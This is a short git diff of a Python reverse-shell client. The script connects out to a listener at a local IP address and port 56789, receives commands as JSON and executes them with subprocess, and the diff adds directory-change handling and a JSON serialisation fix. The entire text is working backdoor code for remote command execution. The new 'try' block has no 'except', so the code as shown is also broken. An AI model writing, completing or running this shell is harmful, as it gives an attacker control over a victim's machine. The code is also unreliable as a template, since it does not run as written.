@@ -6,7 +6,7 @@ import subprocess
 import json
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.1.148", 56789))
+s.connect(("192.168.1.96", 56789))
 
 
 # helper send and receive functions:
@@ -20,7 +20,7 @@ def json_recv():
 			continue
 
 def json_send(data):
-	json_data = json.dump(data)
+	json_data = json.dumps(data)
 	s.send(json_data)
 
 
@@ -30,6 +30,9 @@ def shell():
 		server_cmd = json_recv()
 		if server_cmd == 'q':
 			break
+		elif server_cmd[:2] == "cd" and len(server_cmd) > 1:
+			try:
+				os.chdir(server_cmd[3:])
 		else:
 			# if everything goes a expected, this else condition will run
 			ps = subprocess.Popen(
@@ -44,7 +47,7 @@ def shell():
 
 
 shell()
-s.close()
+#s.close()
 
 
 
